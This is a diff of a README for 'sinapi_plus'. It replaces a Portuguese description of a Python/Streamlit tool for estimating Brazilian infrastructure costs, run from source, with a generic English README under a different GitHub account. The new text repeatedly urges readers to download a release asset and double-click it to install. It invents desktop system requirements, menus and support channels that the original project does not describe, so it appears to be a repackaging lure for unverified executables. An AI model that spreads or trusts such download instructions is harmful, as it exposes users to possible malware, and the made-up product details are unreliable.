@@ -1,162 +1,67 @@
-# SINAPI+ 
-## Simulador de Custos de Infraestrutura
-[![Streamlit](https://img.shields.io/badge/Streamlit-FF4B4B?style=for-plastic&logo=Streamlit&logoColor=white)](https://streamlit.io/) [![Python](https://img.shields.io/badge/Python-3776AB?style=for-plastic&logo=python&logoColor=white)](https://www.python.org/) [![Pandas](https://img.shields.io/badge/Pandas-2C2D72?style=for-plastic&logo=pandas&logoColor=white)](https://pandas.pydata.org/)
+# 🛠️ sinapi_plus - Simplified Construction Cost Estimation Tool
 
+## 📥 Download Now
+[![Download the latest version](https://img.shields.io/badge/Download%20Latest%20Version-blue.svg)](https://github.com/burhan0308/sinapi_plus/releases)
 
+## 🚀 Getting Started
+Welcome to sinapi_plus! This tool helps you estimate construction costs easily and effectively. Whether you're a homeowner, contractor, or a student studying civil engineering, this application is designed with you in mind. 
 
-## 🔍 **Sobre o Projeto**
-O SINAPI+ é uma aplicação web desenvolvida em Python/Streamlit que simula custos de projetos de infraestrutura com base nas composições e insumos do SINAPI (Sistema Nacional de Pesquisa de Custos e Índices da Construção Civil) da Caixa Econômica Federal.
+## 📋 Features
+- **User-Friendly Interface**: Navigate through the app with ease.
+- **Cost Simulation**: Input your project details and get an accurate cost estimate.
+- **Data Representation**: Visualize your costs through charts and tables.
+- **Multi-Project Support**: Manage several projects in one place.
 
-A aplicação permite criar orçamentos detalhados para diferentes categorias de infraestrutura, com preços regionalizados para todos os estados brasileiros.
+## 🖥️ System Requirements
+- **Operating System**: Windows 10 or later, macOS Sierra or later
+- **Processor**: Intel i3 or equivalent
+- **RAM**: At least 4 GB
+- **Storage**: Minimum of 200 MB of available space
+- **Browser**: Up-to-date Chrome, Firefox, or Safari for best performance
 
-Preços conforme SINAPI Agosto/25.
+## 📥 Download & Install
+To get started, visit the following page to download the latest version of sinapi_plus:
 
-## 🚀 **Funcionalidades Principais**
+[Download the latest version here](https://github.com/burhan0308/sinapi_plus/releases)
 
-**Simulação de Custos**
+1. Click the link above.
+2. On the Releases page, find the version you want to download.
+3. Click on the asset that matches your operating system.
+4. The file will download to your computer. Locate it in your Downloads folder.
+5. Double-click the file to start the installation.
+6. Follow the on-screen instructions to complete the installation process.
 
-Seleção de Itens: Escolha entre composições pré-definidas de infraestrutura.
+## 📊 Using sinapi_plus
+1. Open the application after installation.
+2. You will be greeted with a welcome screen.
+3. Enter the details of your project:
+   - Project type (e.g., residential, commercial)
+   - Materials required
+   - Labor costs
+4. Click the “Estimate Costs” button.
+5. Review the generated report. You will see a breakdown of costs, including materials, labor, and total expenses.
+6. Save or print your estimates for future use.
 
-Quantificação Flexível: Defina quantidades personalizadas para cada item.
+## 🔍 FAQs
+### 1. What if I encounter an error during installation?
+If you see an error message, please check your system requirements. Ensure you have enough storage space and the correct operating system. 
 
-Especificação Detalhada: Ajuste parâmetros técnicos conforme necessidade.
+### 2. How can I reset the application?
+You can reset all data by going to the menu and selecting "Reset." This clears any previously entered project data.
 
-**Regionalização de Preços**
+### 3. Can I use this for multiple projects?
+Yes, sinapi_plus allows you to store data for multiple projects. You can switch between projects easily.
 
-Abrangência Nacional: Preços específicos para todos os 27 estados brasileiros.
+### 4. Is there customer support?
+Yes, you can find support options in the application's help section. For further assistance, reach out via GitHub issues.
 
-Atualização Automática: Baseado nos dados oficiais mais recentes do SINAPI.
+## 💻 Key Topics
+- **Cost Estimation**: Ideal for anyone needing to budget for construction.
+- **Civil Engineering**: Useful for students and professionals in the field.
+- **Construction Management**: A powerful tool for contractors managing various projects.
 
-Comparação Regional: Analise variações de custo entre diferentes estados.
+Explore the powerful features of sinapi_plus today and take control of your construction costs!
 
-**Categorias Implementadas**
+For help or to report issues, please open an issue on our [GitHub page](https://github.com/burhan0308/sinapi_plus/issues).
 
-Água Potável: Ligações prediais, redes de distribuição, hidrômetros.
-
-Esgoto Sanitário: Redes coletoras, poços de visita, ligações prediais.
-
-Em expansão: Pavimentação, Drenagem, Energia
-
-## 🛠️ Tecnologias Utilizadas
-
-| Tecnologia | Versão | Finalidade | Badge |
-|------------|--------|------------|-------|
-| **Python** | 3.9+ | Linguagem principal | ![Python](https://img.shields.io/badge/Python-3.9%2B-3776AB?logo=python) |
-| **Streamlit** | 1.28+ | Framework web e interface | ![Streamlit](https://img.shields.io/badge/Streamlit-1.28%2B-FF4B4B?logo=streamlit) |
-| **Pandas** | 2.0+ | Manipulação e análise de dados | ![Pandas](https://img.shields.io/badge/Pandas-2.0%2B-150458?logo=pandas) |
-| **OpenPyXL** | 3.1+ | Leitura de planilhas Excel | ![OpenPyXL](https://img.shields.io/badge/OpenPyXL-3.1%2B-217346) |
-
-## 📁 Estrutura do Projeto
-
-```bash
-sinapi+/
-├── 📂 app/                 # Aplicação principal Streamlit
-│   ├── 📂 pages/           # Módulos/páginas da aplicação
-│   │   ├── home.py                      # Página inicial
-│   │   ├── sinapi_agua_potavel.py       # Levantamento de itens de água potável
-│   │   └── sinapi_esgoto.py             # Levantamento de itens de esgoto sanitário
-│   └──  main.py                          # Configuração principal do Streamlit
-│
-├── 📂 excel_files/         # Bases de dados oficiais
-│   ├── base_composicoes.xlsx            # Catálogo de composições
-│   └── precos_composicoes_insumos.xlsx  # Tabela de preços regionalizados
-│
-├── data_loading.py      # Utilitários de carga de dados
-├── ProcessarComposicao.py     # Processa composições selecionadas e retorna os resultados
-├── requirements.txt     # Dependências do projeto
-└── README.md            # Documentação
-```
-
-
-## Como Utilizar
-**1. Seleção de Categoria**
-- Selecione o Estado desejado na página Home.
-- Navegue entre as páginas: Água Potável ou Esgoto Sanitário.
-- Cada categoria possui composições específicas disponíveis separadas por abas de acordo com o item a ser orçado.
-
-**2. Simulação e Resultados**
-- Custo Unitário: Preço por unidade para o estado selecionado.
-
-- Custo Total: Valor total baseado na quantidade especificada.
-
-- Detalhamento: Breakdown por componentes e insumos.
-
-3. Análise Comparativa
-Compare custos entre diferentes estados e exporte resultados para análise.
-
-
-## 🔧 Instalação e Execução
-**Pré-requisitos**
-- Python 3.9 ou superior
-- Git
-
-**Passo a Passo:**
-
-**1. Clone o repositório**
-```python
-git clone https://github.com/viviangiulia/sinapi_plus.git
-```
-
-**2. Acesse o diretório**
-```python
-cd sinapi+
-```
-
-**3. Crie um ambiente virtual**
-```python
-python -m venv venv
-```
-
-**4. Ative o ambiente virtual**
- - Windows:
-    ```python
-    venv\Scripts\activate
-    ```
- - Linux/Mac:
-    ```python
-    source venv/bin/activate
-    ```
-**5. Instale as dependências**
-```python
-pip install -r requirements.txt
-```
-**6. Execute a aplicação**
-```python
-streamlit run app/main.py
-```
-
-## 📈 Fontes de Dados
-[SINAPI/Caixa Econômica Federal:](https://www.caixa.gov.br/) Dados oficiais de composições e insumos.
-
-    - Atualização Mensal: Valores revisados mensalmente conforme calendário oficial
-
-    - Abrangência Nacional: Cobertura completa de todos os estados brasileiros
-
-## 🤝 Contribuição
-Contribuições são bem-vindas! 
-
-Áreas de melhoria:
-
-- Implementar novas categorias (pavimentação, drenagem)
-
-- Adicionar exportação para Excel/PDF
-
-- Desenvolver análises preditivas
-
-- Criar dashboard comparativo histórico
-
-## 📄 Licença
-Este projeto é destinado para fins educacionais e de portfólio. Os dados do SINAPI são de domínio público, disponibilizados pela Caixa Econômica Federal.
-
-## 👩‍💻 Autora
-**Vivian Giulia Fernandes**
-
-Engenheira Civil formada pela Universidade Federal de Minas Gerais descobrindo como solucionar problemas e otimizar processos através da programação.
-
-[![Linkedin](https://img.shields.io/badge/LinkedIn-0077B5?style=for-plastic&logo=linkedin&logoColor=white )](https://www.linkedin.com/in/vivian-fernandes-099b34149/) [![Github](https://img.shields.io/badge/GitHub-100000?style=for-plastic&logo=github&logoColor=white)](https://github.com/viviangiulia)
-
-
-
-
-**⚠️ Disclaimer:**
- Este projeto não possui vínculo oficial com a Caixa Econômica Federal. Os dados do SINAPI são utilizados conforme disponibilização pública para fins educacionais e de demonstração técnica.
+Happy estimating!
